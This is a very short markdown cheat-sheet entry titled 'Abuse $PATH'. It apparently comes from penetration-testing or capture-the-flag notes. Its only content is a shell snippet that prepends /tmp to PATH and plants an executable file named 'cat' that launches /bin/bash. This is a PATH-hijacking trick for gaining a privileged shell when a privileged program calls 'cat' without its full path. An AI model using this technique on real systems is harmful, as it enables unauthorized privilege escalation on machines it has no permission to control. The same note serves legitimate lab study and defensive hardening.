# Abuse $PATH

```
#1
export PATH=/tmp:$PATH
echo "/bin/bash" > cat
chmod +x cat
```
